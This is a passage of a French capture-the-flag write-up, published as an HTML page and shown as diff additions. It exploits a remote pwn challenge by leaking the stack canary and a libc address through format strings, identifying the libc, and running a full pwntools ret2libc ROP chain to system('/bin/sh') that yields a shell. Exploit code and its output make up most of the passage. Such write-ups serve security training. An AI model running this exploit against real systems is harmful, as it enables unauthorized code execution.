+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">50</span> - b<span style="color:#f1fa8c">&#39;AAAA....(nil)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">51</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x7f8f920d27ed&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">52</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x7ffd40923768&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">53</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x137775000&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">54</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x564e0e625175&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">55</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x7ffd9f160ba9&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">56</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x560d50fbc280&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">57</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x4516be6f0cfd5015&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">58</span> - b<span style="color:#f1fa8c">&#39;AAAA....0x55d29e896090&#39;</span>
+</span></span></code></pre></div><p>BINGO ! On sait qu&rsquo;un Canary se termine pas <code>00</code> . On repère donc la l&rsquo;offset <code>49</code></p>
+<p>On peut le vérifier en faisant leaker la 49ème valeur. Elle se termine à chaque fois par <code>00</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">Verif_Canary</span>(offset):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> _ <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">10</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span>:
+</span></span><span style="display:flex;"><span>            proc <span style="color:#ff79c6">=</span> Get_proc()     
+</span></span><span style="display:flex;"><span>            proc<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;what did you see?:&#39;</span>)     
+</span></span><span style="display:flex;"><span>            proc<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">%%%d</span><span style="color:#f1fa8c">$p&#34;</span> <span style="color:#ff79c6">%</span> offset)
+</span></span><span style="display:flex;"><span>            proc<span style="color:#ff79c6">.</span>recvline()
+</span></span><span style="display:flex;"><span>            res <span style="color:#ff79c6">=</span> proc<span style="color:#ff79c6">.</span>recvline()<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39; &#39;</span>)[<span style="color:#bd93f9">1</span>]
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Test </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c"> - </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">%</span>(_,res))
+</span></span><span style="display:flex;"><span>            proc<span style="color:#ff79c6">.</span>close()
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">except</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Verif_Canary(<span style="color:#bd93f9">49</span>)
+</span></span></code></pre></div><p>Résulat :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c
+</span></span><span style="display:flex;"><span>➜   python3 writeup.py
+</span></span><span style="display:flex;"><span>Test <span style="color:#bd93f9">0</span> - b<span style="color:#f1fa8c">&#39;0x3a3baf68538ce400&#39;</span>
+</span></span><span style="display:flex;"><span>Test <span style="color:#bd93f9">1</span> - b<span style="color:#f1fa8c">&#39;0x1bed75a7af3e8700&#39;</span>
+</span></span><span style="display:flex;"><span>Test <span style="color:#bd93f9">2</span> - b<span style="color:#f1fa8c">&#39;0x17bdade8c75b1400&#39;</span>
+</span></span><span style="display:flex;"><span>Test <span style="color:#bd93f9">3</span> - b<span style="color:#f1fa8c">&#39;0xfcfee3f27277b800&#39;</span>
+</span></span><span style="display:flex;"><span>Test <span style="color:#bd93f9">4</span> - b<span style="color:#f1fa8c">&#39;0x9ac856b2e0729100&#39;</span>
+</span></span><span style="display:flex;"><span>Test <span style="color:#bd93f9">5</span> - b<span style="color:#f1fa8c">&#39;0x631bea7f077e2500&#39;</span>
+</span></span><span style="display:flex;"><span>Test <span style="color:#bd93f9">6</span> - b<span style="color:#f1fa8c">&#39;0xcf3631335f3ddf00&#39;</span>
+</span></span><span style="display:flex;"><span>Test <span style="color:#bd93f9">7</span> - b<span style="color:#f1fa8c">&#39;0x9284289d275e4f00&#39;</span>
+</span></span><span style="display:flex;"><span>Test <span style="color:#bd93f9">8</span> - b<span style="color:#f1fa8c">&#39;0x8ccbd313f0140600&#39;</span>
+</span></span><span style="display:flex;"><span>Test <span style="color:#bd93f9">9</span> - b<span style="color:#f1fa8c">&#39;0x881a52aa94b22b00&#39;</span>
+</span></span></code></pre></div><p>On peut écrire une fonction pour faire leak les adresses rapidement en fonction de l&rsquo;offset :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">Leak_addr</span>(all_leak,proc):
+</span></span><span style="display:flex;"><span>	proc<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;tell me, what did you see?:&#39;</span>)
+</span></span><span style="display:flex;"><span>	payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> leak <span style="color:#ff79c6">in</span> all_leak:
+</span></span><span style="display:flex;"><span>		payload <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;%</span><span style="color:#f1fa8c">{</span>leak<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">$p.&#39;</span>
+</span></span><span style="display:flex;"><span>	proc<span style="color:#ff79c6">.</span>sendline(<span style="color:#8be9fd;font-style:italic">bytes</span>(payload[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>],<span style="color:#f1fa8c">&#39;utf-8&#39;</span>))
+</span></span><span style="display:flex;"><span>	proc<span style="color:#ff79c6">.</span>recvline()
+</span></span><span style="display:flex;"><span>	res <span style="color:#ff79c6">=</span> proc<span style="color:#ff79c6">.</span>recvline()<span style="color:#ff79c6">.</span>decode()<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39; &#39;</span>)[<span style="color:#bd93f9">1</span>]
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">return</span> res<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39;.&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>offset_canary <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">49</span>
+</span></span><span style="display:flex;"><span>proc   <span style="color:#ff79c6">=</span> Get_proc()
+</span></span><span style="display:flex;"><span>canary <span style="color:#ff79c6">=</span> Leak_addr([offset_canary],proc)
+</span></span></code></pre></div><p>Essayer maintenant de trouver ou se place le <strong>canary</strong> sur le buffer de la 2nd entrée :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">Fuzz_overflow</span>():
+</span></span><span style="display:flex;"><span>	offset <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _ <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">100</span>):
+</span></span><span style="display:flex;"><span>		proc <span style="color:#ff79c6">=</span> Get_proc()
+</span></span><span style="display:flex;"><span>		proc<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;what did you see?:&#39;</span>)
+</span></span><span style="display:flex;"><span>		proc<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;A&#39;</span>)
+</span></span><span style="display:flex;"><span>		proc<span style="color:#ff79c6">.</span>recvline()
+</span></span><span style="display:flex;"><span>		proc<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;A&#39;</span><span style="color:#ff79c6">*</span>_<span style="color:#ff79c6">*</span><span style="color:#bd93f9">8</span>)
+</span></span><span style="display:flex;"><span>		resp <span style="color:#ff79c6">=</span> proc<span style="color:#ff79c6">.</span>recvall(timeout <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0.2</span>)<span style="color:#ff79c6">.</span>decode()<span style="color:#ff79c6">.</span>strip()<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>,<span style="color:#f1fa8c">&#39; | &#39;</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">print</span>(_,<span style="color:#f1fa8c">&#39; | &#39;</span>,resp)
+</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span>(<span style="color:#f1fa8c">&#34;stack smashing detected&#34;</span> <span style="color:#ff79c6">in</span> resp):
+</span></span><span style="display:flex;"><span>			offset <span style="color:#ff79c6">=</span> _
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">return</span> offset
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#bd93f9">35</span>  |  a A ?nice one | please, give me a feedback:  | thanks, see you later
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">36</span>  |  a A ?nice one | please, give me a feedback:  | thanks, see you later
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">37</span>  |  a A ?nice one | please, give me a feedback:  | thanks, see you later
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">38</span>  |  a A ?nice one | please, give me a feedback:  | thanks, see you later
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">39</span>  |  a A ?nice one | please, give me a feedback:  | thanks, see you later
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">40</span>  |  a A ?nice one | please, give me a feedback:  | thanks, see you later | *** stack smashing detected ***: terminated
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">41</span>  |  a A ?nice one | please, give me a feedback:  | thanks, see you later | *** stack smashing detected ***: terminated
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">42</span>  |  a A ?nice one | please, give me a feedback:  | thanks, see you later | *** stack smashing detected ***: terminated
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">43</span>  |  a A ?nice one | please, give me a feedback:  | thanks, see you later | *** stack smashing detected ***: terminated
+</span></span></code></pre></div><p>On sait donc que la buffer est de taille <code>39</code> et que le canary se place juste après à la position <code>40</code></p>
+<h6 id="lattaque-ret2libc">L&rsquo;attaque Ret2Libc</h6>
+<p>Nôtre idée était de trouver la libc utiliser et de faire Leak une fonction telle que <strong>puts</strong> ou <strong>printf</strong></p>
+<p>Pour se faire , voici le pattern que nous avons utilisé pour chercher les adresses du programmes :</p>
+<ul>
+<li><em>[</em> Padding du buffer de 39char <em>]</em> + <em>[</em> Canary <em>]</em> +<em>[</em> BBBBBBBB <em>]</em>(=rbp) +  <em>[</em> Addresse <em>]</em></li>
+</ul>
+<p>Ainsi de cette manière , nous avons exécuté des attaques <strong>Ret2Win</strong> à la recherche de printf
+Malhereusement , <strong>nous n&rsquo;avons pas trouvé ces fonctions dans le binaire</strong> . Il y a une raison trés simple &hellip;
+Nous n&rsquo;étions pas dans le binaire mais <strong>dans la libc .</strong></p>
+<p>Pourtant une chose nous à servis pour la suite :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">Leak_puts</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1000</span>,<span style="color:#bd93f9">1000</span>):
+</span></span><span style="display:flex;"><span>        proc <span style="color:#ff79c6">=</span> Get_proc()
+</span></span><span style="display:flex;"><span>        canary,libc_start_main_ret <span style="color:#ff79c6">=</span> Leak_addr([<span style="color:#bd93f9">49</span>,<span style="color:#bd93f9">51</span>],proc)
+</span></span><span style="display:flex;"><span>        proc<span style="color:#ff79c6">.</span>recvline()
+</span></span><span style="display:flex;"><span>        payload  <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;A&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">39</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">8</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#8be9fd;font-style:italic">int</span>(canary,<span style="color:#bd93f9">16</span>))
+</span></span><span style="display:flex;"><span>        payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#8be9fd;font-style:italic">int</span>(libc_start_main_ret,<span style="color:#bd93f9">16</span>))
+</span></span><span style="display:flex;"><span>        payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#8be9fd;font-style:italic">int</span>(libc_start_main_ret,<span style="color:#bd93f9">16</span>)<span style="color:#ff79c6">+</span> x)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        proc<span style="color:#ff79c6">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>        response <span style="color:#ff79c6">=</span> proc<span style="color:#ff79c6">.</span>recvall(timeout <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0.5</span>)<span style="color:#ff79c6">.</span>strip()
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(x,<span style="color:#f1fa8c">&#39; | &#39;</span>,response)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Leak_puts()
+</span></span></code></pre></div><p>Résultat :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#bd93f9">303</span>  |  b<span style="color:#f1fa8c">&#39;thanks, see you later&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">304</span>  |  b<span style="color:#f1fa8c">&#39;thanks, see you later&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">305</span>  |  b<span style="color:#f1fa8c">&#39;thanks, see you later\n*** stack smashing detected ***: terminated&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">306</span>  |  b<span style="color:#f1fa8c">&#39;thanks, see you later&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">307</span>  |  b<span style="color:#f1fa8c">&#39;thanks, see you later\n*** stack smashing detected ***: terminated&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">308</span>  |  b<span style="color:#f1fa8c">&#39;thanks, see you later&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">309</span>  |  b<span style="color:#f1fa8c">&#39;thanks, see you later&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">310</span>  |  b<span style="color:#f1fa8c">&#39;thanks, see you later&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">311</span>  |  b<span style="color:#f1fa8c">&#39;thanks, see you later&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">312</span>  |  b<span style="color:#f1fa8c">&#39;thanks, see you later\n*** stack smashing detected ***: terminated&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">313</span>  |  b<span style="color:#f1fa8c">&#39;thanks, see you later\nGNU C Library (Debian GLIBC 2.33-1) release release version 2.33.\nCopyright (C) 2021 Free Software Foundation, Inc.\nThis is free software; see the source for copying conditions.\nThere is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A\nPARTICULAR PURPOSE.\nCompiled by GNU CC version 10.3.1 20211117.\nlibc ABIs: UNIQUE IFUNC ABSOLUTE\nFor bug reporting instructions, please see:\n&lt;http://www.debian.org/Bugs/&gt;.&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">314</span>  |  b<span style="color:#f1fa8c">&#39;thanks, see you later&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">315</span>  |  b<span style="color:#f1fa8c">&#39;thanks, see you later\nGNU C Library (Debian GLIBC 2.33-1) release release version 2.33.\nCopyright (C) 2021 Free Software Foundation, Inc.\nThis is free software; see the source for copying conditions.\nThere is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A\nPARTICULAR PURPOSE.\nCompiled by GNU CC version 10.3.1 20211117.\nlibc ABIs: UNIQUE IFUNC ABSOLUTE\nFor bug reporting instructions, please see:\n&lt;http://www.debian.org/Bugs/&gt;.&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">316</span>  |  b<span style="color:#f1fa8c">&#39;thanks, see you later&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">317</span>  |  b<span style="color:#f1fa8c">&#39;thanks, see you later&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">318</span>  |  b<span style="color:#f1fa8c">&#39;thanks, see you later&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">319</span>  |  b<span style="color:#f1fa8c">&#39;thanks, see you later\n*** stack smashing detected ***: terminated&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">320</span>  |  b<span style="color:#f1fa8c">&#39;thanks, see you later&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">321</span>  |  b<span style="color:#f1fa8c">&#39;thanks, see you later&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">322</span>  |  b<span style="color:#f1fa8c">&#39;thanks, see you later&#39;</span>
+</span></span></code></pre></div><p>Hourra ! Nous avons la libc : <code>(Debian GLIBC 2.33-1) release release version 2.33</code> !
+Plus exactement : <strong>libc6_2.28-10deb10u1_amd64.so</strong></p>
+<h6 id="finalisation">Finalisation</h6>
+<p>Maintenant que nous avons la libc , il nous faut trouver la base de celle exécuté en remote ou trouver un leak .</p>
+<p>Nous avons pris du temps à réaliser que l&rsquo;adresse après la <code>PIE</code> , elle même après le <code>Canary</code> était en faite l&rsquo;adresse <code>libc_start_main_ret</code> et non <code>rip</code> comme nous pensions .</p>
+<p>Grâce à <a href="https://github.com/niklasb/libc-database"  target="_blank" rel="noopener" >libc-database</a> , on peut trouver l&rsquo;offset pour obtenir la base de la libc</p>
+<pre tabindex="0"><code>./dump libc6_2.28-10+deb10u1_amd64 __libc_start_main_ret
+offset___libc_start_main_ret = 0x2409b
+</code></pre><p>Voici le script final avec un <strong>Ret2Libc</strong> similaire à mon précédent writeup .</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4">#!/usr/bin/env python</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -*- coding: utf-8 -*-</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>update(arch<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;amd64&#34;</span>, os<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;linux&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#39;./libc6_2.28-10deb10u1_amd64.so&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url  <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;warzone.hackrocks.com&#39;</span>
+</span></span><span style="display:flex;"><span>port <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">7772</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">Get_proc</span>():	<span style="color:#ff79c6">return</span> connect(url,port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">Leak_addr</span>(all_leak,proc):
+</span></span><span style="display:flex;"><span>	proc<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;tell me, what did you see?:&#39;</span>)
+</span></span><span style="display:flex;"><span>	payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> leak <span style="color:#ff79c6">in</span> all_leak:
+</span></span><span style="display:flex;"><span>		payload <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;%</span><span style="color:#f1fa8c">{</span>leak<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">$p.&#39;</span>
+</span></span><span style="display:flex;"><span>	proc<span style="color:#ff79c6">.</span>sendline(<span style="color:#8be9fd;font-style:italic">bytes</span>(payload[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>],<span style="color:#f1fa8c">&#39;utf-8&#39;</span>))
+</span></span><span style="display:flex;"><span>	proc<span style="color:#ff79c6">.</span>recvline()
+</span></span><span style="display:flex;"><span>	res <span style="color:#ff79c6">=</span> proc<span style="color:#ff79c6">.</span>recvline()<span style="color:#ff79c6">.</span>decode()<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39; &#39;</span>)[<span style="color:#bd93f9">1</span>]
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">return</span> res<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39;.&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc <span style="color:#ff79c6">=</span> Get_proc()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>offset_canary <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">49</span>
+</span></span><span style="display:flex;"><span>offset__libc_start_main_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">51</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>canary , libc_leak <span style="color:#ff79c6">=</span> Leak_addr([offset_canary,offset__libc_start_main_ret],proc)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(libc_leak,<span style="color:#bd93f9">16</span>) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x2409b</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;Canary : &#39;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">hex</span>(<span style="color:#8be9fd;font-style:italic">int</span>(canary,<span style="color:#bd93f9">16</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;Libc   : &#39;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">hex</span>(libc<span style="color:#ff79c6">.</span>address))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff79c6">=</span> ROP(libc)
+</span></span><span style="display:flex;"><span>pop_rdi    <span style="color:#ff79c6">=</span> rop<span style="color:#ff79c6">.</span>find_gadget([<span style="color:#f1fa8c">&#39;pop rdi&#39;</span>, <span style="color:#f1fa8c">&#39;ret&#39;</span>])[<span style="color:#bd93f9">0</span>]
+</span></span><span style="display:flex;"><span>ret        <span style="color:#ff79c6">=</span> rop<span style="color:#ff79c6">.</span>find_gadget([<span style="color:#f1fa8c">&#39;ret&#39;</span>])[<span style="color:#bd93f9">0</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;A&#39;</span><span style="color:#ff79c6">*</span>(<span style="color:#bd93f9">8</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">39</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#8be9fd;font-style:italic">int</span>(canary,<span style="color:#bd93f9">16</span>))
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;B&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">8</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(pop_rdi)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(<span style="color:#8be9fd;font-style:italic">next</span>(libc<span style="color:#ff79c6">.</span>search(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;/bin/sh</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span>)))
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> p64(libc<span style="color:#ff79c6">.</span>sym[<span style="color:#f1fa8c">&#39;system&#39;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc<span style="color:#ff79c6">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>proc<span style="color:#ff79c6">.</span>interactive()
+</span></span></code></pre></div><p>Maintenant On a le Flag !</p>
+<p><img src="./img/flag.png" alt="Alt text"></p>
+
+  </article>
+
+</div>
+
+
+  </div>
+<script type="text/javascript" src="/main.js" defer></script>
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-3EGPCQCHEK"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-3EGPCQCHEK', { 'anonymize_ip': false });
+}
+</script>
+
+</body>
+
+</html>
